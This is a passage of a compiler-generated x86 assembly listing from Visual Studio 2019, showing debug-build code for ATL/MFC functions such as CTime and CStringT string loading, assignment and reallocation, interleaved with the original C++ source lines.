; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atltime.h
;	COMDAT ??0CTime@ATL@@QAE@_J@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
_time$ = 8						; size = 8
??0CTime@ATL@@QAE@_J@Z PROC				; ATL::CTime::CTime, COMDAT
; _this$ = ecx

; 418  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 417  : 	m_time( time )

  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR _time$[ebp]
  00012	89 08		 mov	 DWORD PTR [eax], ecx
  00014	8b 55 0c	 mov	 edx, DWORD PTR _time$[ebp+4]
  00017	89 50 04	 mov	 DWORD PTR [eax+4], edx

; 419  : }

  0001a	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001d	5f		 pop	 edi
  0001e	5e		 pop	 esi
  0001f	5b		 pop	 ebx
  00020	8b e5		 mov	 esp, ebp
  00022	5d		 pop	 ebp
  00023	c2 08 00	 ret	 8
??0CTime@ATL@@QAE@_J@Z ENDP				; ATL::CTime::CTime
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\cstringt.h
;	COMDAT ?CheckImplicitLoad@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@AAE_NPBX@Z
_TEXT	SEGMENT
_nID$1 = -12						; size = 4
_bRet$ = -5						; size = 1
_this$ = -4						; size = 4
_pv$ = 8						; size = 4
?CheckImplicitLoad@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@AAE_NPBX@Z PROC ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::CheckImplicitLoad, COMDAT
; _this$ = ecx

; 2665 : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 4c	 sub	 esp, 76			; 0000004cH
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2666 : 		bool bRet = false;

  0000c	c6 45 fb 00	 mov	 BYTE PTR _bRet$[ebp], 0

; 2667 : 
; 2668 : 		if( (pv != NULL) && IS_INTRESOURCE( pv ) )

  00010	83 7d 08 00	 cmp	 DWORD PTR _pv$[ebp], 0
  00014	74 28		 je	 SHORT $LN2@CheckImpli
  00016	8b 45 08	 mov	 eax, DWORD PTR _pv$[ebp]
  00019	c1 e8 10	 shr	 eax, 16			; 00000010H
  0001c	85 c0		 test	 eax, eax
  0001e	75 1e		 jne	 SHORT $LN2@CheckImpli

; 2669 : 		{
; 2670 : 			UINT nID = LOWORD( reinterpret_cast< DWORD_PTR >( pv ) );

  00020	8b 45 08	 mov	 eax, DWORD PTR _pv$[ebp]
  00023	25 ff ff 00 00	 and	 eax, 65535		; 0000ffffH
  00028	0f b7 c8	 movzx	 ecx, ax
  0002b	89 4d f4	 mov	 DWORD PTR _nID$1[ebp], ecx

; 2671 : 			(nID);
; 2672 : #ifdef _ATL_USE_WINAPI_FAMILY_DESKTOP_APP
; 2673 : 			if( !LoadString( nID ) )

  0002e	8b 45 f4	 mov	 eax, DWORD PTR _nID$1[ebp]
  00031	50		 push	 eax
  00032	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00035	e8 00 00 00 00	 call	 ?LoadStringA@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEHI@Z ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::LoadStringA

; 2674 : 			{
; 2675 : 				ATLTRACE( atlTraceString, 2, _T( "Warning: implicit LoadString(%u) failed\n" ), nID );
; 2676 : 			}
; 2677 : 			bRet = true;

  0003a	c6 45 fb 01	 mov	 BYTE PTR _bRet$[ebp], 1
$LN2@CheckImpli:

; 2678 : #else
; 2679 : 			ATLTRACE( atlTraceString, 2, _T( "Warning: LoadString(%u) not supported under the current WINAPI_FAMILY.\n" ), nID );
; 2680 : #endif
; 2681 : 		}
; 2682 : 
; 2683 : 		return( bRet );

  0003e	8a 45 fb	 mov	 al, BYTE PTR _bRet$[ebp]

; 2684 : 	}

  00041	5f		 pop	 edi
  00042	5e		 pop	 esi
  00043	5b		 pop	 ebx
  00044	8b e5		 mov	 esp, ebp
  00046	5d		 pop	 ebp
  00047	c2 04 00	 ret	 4
?CheckImplicitLoad@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@AAE_NPBX@Z ENDP ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::CheckImplicitLoad
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\cstringt.h
;	COMDAT ?LoadStringA@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEHPAUHINSTANCE__@@I@Z
_TEXT	SEGMENT
_pszBuffer$ = -16					; size = 4
_nLength$ = -12						; size = 4
_pImage$ = -8						; size = 4
_this$ = -4						; size = 4
_hInstance$ = 8						; size = 4
_nID$ = 12						; size = 4
?LoadStringA@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEHPAUHINSTANCE__@@I@Z PROC ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::LoadStringA, COMDAT
; _this$ = ecx

; 2344 : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 50	 sub	 esp, 80			; 00000050H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2345 : 		const ATLSTRINGRESOURCEIMAGE* pImage = AtlGetStringResourceImage( hInstance, nID );

  0000c	8b 45 0c	 mov	 eax, DWORD PTR _nID$[ebp]
  0000f	50		 push	 eax
  00010	8b 4d 08	 mov	 ecx, DWORD PTR _hInstance$[ebp]
  00013	51		 push	 ecx
  00014	e8 00 00 00 00	 call	 ?AtlGetStringResourceImage@ATL@@YAPBUATLSTRINGRESOURCEIMAGE@1@PAUHINSTANCE__@@I@Z ; ATL::AtlGetStringResourceImage
  00019	83 c4 08	 add	 esp, 8
  0001c	89 45 f8	 mov	 DWORD PTR _pImage$[ebp], eax

; 2346 : 		if( pImage == NULL )

  0001f	83 7d f8 00	 cmp	 DWORD PTR _pImage$[ebp], 0
  00023	75 04		 jne	 SHORT $LN2@LoadString

; 2347 : 		{
; 2348 : 			return( FALSE );

  00025	33 c0		 xor	 eax, eax
  00027	eb 57		 jmp	 SHORT $LN1@LoadString
$LN2@LoadString:

; 2349 : 		}
; 2350 : 
; 2351 : 		int nLength = StringTraits::GetBaseTypeLength( pImage->achString, pImage->nLength );

  00029	8b 45 f8	 mov	 eax, DWORD PTR _pImage$[ebp]
  0002c	0f b7 08	 movzx	 ecx, WORD PTR [eax]
  0002f	51		 push	 ecx
  00030	8b 55 f8	 mov	 edx, DWORD PTR _pImage$[ebp]
  00033	83 c2 02	 add	 edx, 2
  00036	52		 push	 edx
  00037	e8 00 00 00 00	 call	 ?GetBaseTypeLength@?$ChTraitsCRT@D@ATL@@SAHPB_WH@Z ; ATL::ChTraitsCRT<char>::GetBaseTypeLength
  0003c	83 c4 08	 add	 esp, 8
  0003f	89 45 f4	 mov	 DWORD PTR _nLength$[ebp], eax

; 2352 : 		PXSTR pszBuffer = this->GetBuffer( nLength );

  00042	8b 45 f4	 mov	 eax, DWORD PTR _nLength$[ebp]
  00045	50		 push	 eax
  00046	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00049	e8 00 00 00 00	 call	 ?GetBuffer@?$CSimpleStringT@D$0A@@ATL@@QAEPADH@Z ; ATL::CSimpleStringT<char,0>::GetBuffer
  0004e	89 45 f0	 mov	 DWORD PTR _pszBuffer$[ebp], eax

; 2353 : 		StringTraits::ConvertToBaseType( pszBuffer, nLength, pImage->achString, pImage->nLength );

  00051	8b 45 f8	 mov	 eax, DWORD PTR _pImage$[ebp]
  00054	0f b7 08	 movzx	 ecx, WORD PTR [eax]
  00057	51		 push	 ecx
  00058	8b 55 f8	 mov	 edx, DWORD PTR _pImage$[ebp]
  0005b	83 c2 02	 add	 edx, 2
  0005e	52		 push	 edx
  0005f	8b 45 f4	 mov	 eax, DWORD PTR _nLength$[ebp]
  00062	50		 push	 eax
  00063	8b 4d f0	 mov	 ecx, DWORD PTR _pszBuffer$[ebp]
  00066	51		 push	 ecx
  00067	e8 00 00 00 00	 call	 ?ConvertToBaseType@?$ChTraitsCRT@D@ATL@@SAXPADHPB_WH@Z ; ATL::ChTraitsCRT<char>::ConvertToBaseType
  0006c	83 c4 10	 add	 esp, 16			; 00000010H

; 2354 : 		this->ReleaseBufferSetLength( nLength );

  0006f	8b 45 f4	 mov	 eax, DWORD PTR _nLength$[ebp]
  00072	50		 push	 eax
  00073	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00076	e8 00 00 00 00	 call	 ?ReleaseBufferSetLength@?$CSimpleStringT@D$0A@@ATL@@QAEXH@Z ; ATL::CSimpleStringT<char,0>::ReleaseBufferSetLength

; 2355 : 
; 2356 : 		return( TRUE );

  0007b	b8 01 00 00 00	 mov	 eax, 1
$LN1@LoadString:

; 2357 : 	}

  00080	5f		 pop	 edi
  00081	5e		 pop	 esi
  00082	5b		 pop	 ebx
  00083	8b e5		 mov	 esp, ebp
  00085	5d		 pop	 ebp
  00086	c2 08 00	 ret	 8
?LoadStringA@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEHPAUHINSTANCE__@@I@Z ENDP ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::LoadStringA
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\cstringt.h
;	COMDAT ?LoadStringA@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEHI@Z
_TEXT	SEGMENT
_hInst$ = -8						; size = 4
_this$ = -4						; size = 4
_nID$ = 8						; size = 4
?LoadStringA@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEHI@Z PROC ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::LoadStringA, COMDAT
; _this$ = ecx

; 2330 : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2331 : 		HINSTANCE hInst = StringTraits::FindStringResourceInstance( nID );

  0000c	8b 45 08	 mov	 eax, DWORD PTR _nID$[ebp]
  0000f	50		 push	 eax
  00010	e8 00 00 00 00	 call	 ?FindStringResourceInstance@?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@SAPAUHINSTANCE__@@I@Z ; StrTraitMFC<char,ATL::ChTraitsCRT<char> >::FindStringResourceInstance
  00015	83 c4 04	 add	 esp, 4
  00018	89 45 f8	 mov	 DWORD PTR _hInst$[ebp], eax

; 2332 : 		if( hInst == NULL )

  0001b	83 7d f8 00	 cmp	 DWORD PTR _hInst$[ebp], 0
  0001f	75 04		 jne	 SHORT $LN2@LoadString

; 2333 : 		{
; 2334 : 			return( FALSE );

  00021	33 c0		 xor	 eax, eax
  00023	eb 10		 jmp	 SHORT $LN1@LoadString
$LN2@LoadString:

; 2335 : 		}
; 2336 : 
; 2337 : 		return( LoadString( hInst, nID ) );

  00025	8b 45 08	 mov	 eax, DWORD PTR _nID$[ebp]
  00028	50		 push	 eax
  00029	8b 4d f8	 mov	 ecx, DWORD PTR _hInst$[ebp]
  0002c	51		 push	 ecx
  0002d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00030	e8 00 00 00 00	 call	 ?LoadStringA@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEHPAUHINSTANCE__@@I@Z ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::LoadStringA
$LN1@LoadString:

; 2338 : 	}

  00035	5f		 pop	 edi
  00036	5e		 pop	 esi
  00037	5b		 pop	 ebx
  00038	8b e5		 mov	 esp, ebp
  0003a	5d		 pop	 ebp
  0003b	c2 04 00	 ret	 4
?LoadStringA@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEHI@Z ENDP ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::LoadStringA
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\cstringt.h
;	COMDAT ??4?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEAAV01@PBD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
_pszSrc$ = 8						; size = 4
??4?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEAAV01@PBD@Z PROC ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::operator=, COMDAT
; _this$ = ecx

; 1314 : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1315 : 		CThisSimpleString::operator=( pszSrc );

  0000c	8b 45 08	 mov	 eax, DWORD PTR _pszSrc$[ebp]
  0000f	50		 push	 eax
  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	e8 00 00 00 00	 call	 ??4?$CSimpleStringT@D$0A@@ATL@@QAEAAV01@PBD@Z ; ATL::CSimpleStringT<char,0>::operator=

; 1316 : 
; 1317 : 		return( *this );

  00018	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]

; 1318 : 	}

  0001b	5f		 pop	 edi
  0001c	5e		 pop	 esi
  0001d	5b		 pop	 ebx
  0001e	8b e5		 mov	 esp, ebp
  00020	5d		 pop	 ebp
  00021	c2 04 00	 ret	 4
??4?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEAAV01@PBD@Z ENDP ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::operator=
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\cstringt.h
;	COMDAT ??1?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@XZ PROC ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::~CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >, COMDAT
; _this$ = ecx

; 1294 : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1295 : 	}

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ??1?$CSimpleStringT@D$0A@@ATL@@QAE@XZ ; ATL::CSimpleStringT<char,0>::~CSimpleStringT<char,0>
  00014	5f		 pop	 edi
  00015	5e		 pop	 esi
  00016	5b		 pop	 ebx
  00017	8b e5		 mov	 esp, ebp
  00019	5d		 pop	 ebp
  0001a	c3		 ret	 0
??1?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@XZ ENDP ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::~CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\cstringt.h
;	COMDAT ??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z
_TEXT	SEGMENT
_this$ = -16						; size = 4
__$EHRec$ = -12						; size = 12
_pszSrc$ = 8						; size = 4
??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z PROC ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >, COMDAT
; _this$ = ecx

; 1045 : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	6a ff		 push	 -1
  00005	68 00 00 00 00	 push	 __ehhandler$??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z
  0000a	64 a1 00 00 00
	00		 mov	 eax, DWORD PTR fs:0
  00010	50		 push	 eax
  00011	83 ec 44	 sub	 esp, 68			; 00000044H
  00014	53		 push	 ebx
  00015	56		 push	 esi
  00016	57		 push	 edi
  00017	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0001c	33 c5		 xor	 eax, ebp
  0001e	50		 push	 eax
  0001f	8d 45 f4	 lea	 eax, DWORD PTR __$EHRec$[ebp]
  00022	64 a3 00 00 00
	00		 mov	 DWORD PTR fs:0, eax
  00028	89 4d f0	 mov	 DWORD PTR _this$[ebp], ecx

; 1044 : 		CThisSimpleString( StringTraits::GetDefaultManager() )

  0002b	e8 00 00 00 00	 call	 ?GetDefaultManager@?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@SAPAUIAtlStringMgr@ATL@@XZ ; StrTraitMFC<char,ATL::ChTraitsCRT<char> >::GetDefaultManager
  00030	50		 push	 eax
  00031	8b 4d f0	 mov	 ecx, DWORD PTR _this$[ebp]
  00034	e8 00 00 00 00	 call	 ??0?$CSimpleStringT@D$0A@@ATL@@QAE@PAUIAtlStringMgr@1@@Z ; ATL::CSimpleStringT<char,0>::CSimpleStringT<char,0>
  00039	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+8], 0

; 1046 : 		if( !CheckImplicitLoad( pszSrc ) )

  00040	8b 45 08	 mov	 eax, DWORD PTR _pszSrc$[ebp]
  00043	50		 push	 eax
  00044	8b 4d f0	 mov	 ecx, DWORD PTR _this$[ebp]
  00047	e8 00 00 00 00	 call	 ?CheckImplicitLoad@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@AAE_NPBX@Z ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::CheckImplicitLoad
  0004c	0f b6 c8	 movzx	 ecx, al
  0004f	85 c9		 test	 ecx, ecx
  00051	75 0c		 jne	 SHORT $LN1@CStringT

; 1047 : 		{
; 1048 : 			*this = pszSrc;

  00053	8b 45 08	 mov	 eax, DWORD PTR _pszSrc$[ebp]
  00056	50		 push	 eax
  00057	8b 4d f0	 mov	 ecx, DWORD PTR _this$[ebp]
  0005a	e8 00 00 00 00	 call	 ??4?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEAAV01@PBD@Z ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::operator=
$LN1@CStringT:

; 1049 : 		}
; 1050 : 	}

  0005f	c7 45 fc ff ff
	ff ff		 mov	 DWORD PTR __$EHRec$[ebp+8], -1
  00066	8b 45 f0	 mov	 eax, DWORD PTR _this$[ebp]
  00069	8b 4d f4	 mov	 ecx, DWORD PTR __$EHRec$[ebp]
  0006c	64 89 0d 00 00
	00 00		 mov	 DWORD PTR fs:0, ecx
  00073	59		 pop	 ecx
  00074	5f		 pop	 edi
  00075	5e		 pop	 esi
  00076	5b		 pop	 ebx
  00077	8b e5		 mov	 esp, ebp
  00079	5d		 pop	 ebp
  0007a	c2 04 00	 ret	 4
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__unwindfunclet$??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z$0:
  00000	8b 4d f0	 mov	 ecx, DWORD PTR _this$[ebp]
  00003	e9 00 00 00 00	 jmp	 ??1?$CSimpleStringT@D$0A@@ATL@@QAE@XZ ; ATL::CSimpleStringT<char,0>::~CSimpleStringT<char,0>
  00008	cc		 int	 3
  00009	cc		 int	 3
  0000a	cc		 int	 3
  0000b	cc		 int	 3
  0000c	cc		 int	 3
__ehhandler$??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z:
  0000d	90		 npad	 1
  0000e	90		 npad	 1
  0000f	8b 54 24 08	 mov	 edx, DWORD PTR [esp+8]
  00013	8d 42 0c	 lea	 eax, DWORD PTR [edx+12]
  00016	8b 4a ac	 mov	 ecx, DWORD PTR [edx-84]
  00019	33 c8		 xor	 ecx, eax
  0001b	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00020	b8 00 00 00 00	 mov	 eax, OFFSET __ehfuncinfo$??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z
  00025	e9 00 00 00 00	 jmp	 ___CxxFrameHandler3
text$x	ENDS
??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z ENDP ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?SetLength@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
_nLength$ = 8						; size = 4
?SetLength@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z PROC	; ATL::CSimpleStringT<char,0>::SetLength, COMDAT
; _this$ = ecx

; 867  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 868  : 		ATLASSERT( nLength >= 0 );
; 869  : 		ATLASSERT( nLength <= GetData()->nAllocLength );
; 870  : 
; 871  : 		if( nLength < 0 || nLength > GetData()->nAllocLength)

  0000c	83 7d 08 00	 cmp	 DWORD PTR _nLength$[ebp], 0
  00010	7c 10		 jl	 SHORT $LN3@SetLength
  00012	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00015	e8 00 00 00 00	 call	 ?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ ; ATL::CSimpleStringT<char,0>::GetData
  0001a	8b 4d 08	 mov	 ecx, DWORD PTR _nLength$[ebp]
  0001d	3b 48 08	 cmp	 ecx, DWORD PTR [eax+8]
  00020	7e 0a		 jle	 SHORT $LN2@SetLength
$LN3@SetLength:

; 872  : 			AtlThrow(E_INVALIDARG);

  00022	68 57 00 07 80	 push	 -2147024809		; 80070057H
  00027	e8 00 00 00 00	 call	 ?AtlThrowImpl@ATL@@YGXJ@Z ; ATL::AtlThrowImpl
$LN2@SetLength:

; 873  : 
; 874  : 		GetData()->nDataLength = nLength;

  0002c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002f	e8 00 00 00 00	 call	 ?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ ; ATL::CSimpleStringT<char,0>::GetData
  00034	8b 4d 08	 mov	 ecx, DWORD PTR _nLength$[ebp]
  00037	89 48 04	 mov	 DWORD PTR [eax+4], ecx

; 875  : 		m_pszData[nLength] = 0;

  0003a	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0003d	8b 08		 mov	 ecx, DWORD PTR [eax]
  0003f	8b 55 08	 mov	 edx, DWORD PTR _nLength$[ebp]
  00042	c6 04 11 00	 mov	 BYTE PTR [ecx+edx], 0
$LN4@SetLength:

; 876  : 	}

  00046	5f		 pop	 edi
  00047	5e		 pop	 esi
  00048	5b		 pop	 ebx
  00049	8b e5		 mov	 esp, ebp
  0004b	5d		 pop	 ebp
  0004c	c2 04 00	 ret	 4
?SetLength@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z ENDP	; ATL::CSimpleStringT<char,0>::SetLength
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?Reallocate@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z
_TEXT	SEGMENT
_pNewData$ = -16					; size = 4
_pStringMgr$ = -12					; size = 4
_pOldData$ = -8						; size = 4
_this$ = -4						; size = 4
_nLength$ = 8						; size = 4
?Reallocate@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z PROC	; ATL::CSimpleStringT<char,0>::Reallocate, COMDAT
; _this$ = ecx

; 849  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 50	 sub	 esp, 80			; 00000050H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 850  : 		CStringData* pOldData = GetData();

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ ; ATL::CSimpleStringT<char,0>::GetData
  00014	89 45 f8	 mov	 DWORD PTR _pOldData$[ebp], eax

; 851  : 		ATLASSERT( pOldData->nAllocLength < nLength );
; 852  : 		IAtlStringMgr* pStringMgr = pOldData->pStringMgr;

  00017	8b 45 f8	 mov	 eax, DWORD PTR _pOldData$[ebp]
  0001a	8b 08		 mov	 ecx, DWORD PTR [eax]
  0001c	89 4d f4	 mov	 DWORD PTR _pStringMgr$[ebp], ecx

; 853  : 		if ( pOldData->nAllocLength >= nLength || nLength <= 0)

  0001f	8b 45 f8	 mov	 eax, DWORD PTR _pOldData$[ebp]
  00022	8b 48 08	 mov	 ecx, DWORD PTR [eax+8]
  00025	3b 4d 08	 cmp	 ecx, DWORD PTR _nLength$[ebp]
  00028	7d 06		 jge	 SHORT $LN3@Reallocate
  0002a	83 7d 08 00	 cmp	 DWORD PTR _nLength$[ebp], 0
  0002e	7f 07		 jg	 SHORT $LN2@Reallocate
$LN3@Reallocate:

; 854  : 		{
; 855  : 			ThrowMemoryException();

  00030	e8 00 00 00 00	 call	 ?ThrowMemoryException@?$CSimpleStringT@D$0A@@ATL@@KAXXZ ; ATL::CSimpleStringT<char,0>::ThrowMemoryException

; 856  : 			return;

  00035	eb 31		 jmp	 SHORT $LN5@Reallocate
$LN2@Reallocate:

; 857  : 		}
; 858  : 		CStringData* pNewData = pStringMgr->Reallocate( pOldData, nLength, sizeof( XCHAR ) );

  00037	6a 01		 push	 1
  00039	8b 45 08	 mov	 eax, DWORD PTR _nLength$[ebp]
  0003c	50		 push	 eax
  0003d	8b 4d f8	 mov	 ecx, DWORD PTR _pOldData$[ebp]
  00040	51		 push	 ecx
  00041	8b 55 f4	 mov	 edx, DWORD PTR _pStringMgr$[ebp]
  00044	8b 02		 mov	 eax, DWORD PTR [edx]
  00046	8b 4d f4	 mov	 ecx, DWORD PTR _pStringMgr$[ebp]
  00049	8b 50 08	 mov	 edx, DWORD PTR [eax+8]
  0004c	ff d2		 call	 edx
  0004e	89 45 f0	 mov	 DWORD PTR _pNewData$[ebp], eax

; 859  : 		if( pNewData == NULL )

  00051	83 7d f0 00	 cmp	 DWORD PTR _pNewData$[ebp], 0
  00055	75 05		 jne	 SHORT $LN4@Reallocate

; 860  : 		{
; 861  : 			ThrowMemoryException();

  00057	e8 00 00 00 00	 call	 ?ThrowMemoryException@?$CSimpleStringT@D$0A@@ATL@@KAXXZ ; ATL::CSimpleStringT<char,0>::ThrowMemoryException
$LN4@Reallocate:

; 862  : 		}
; 863  : 		Attach( pNewData );

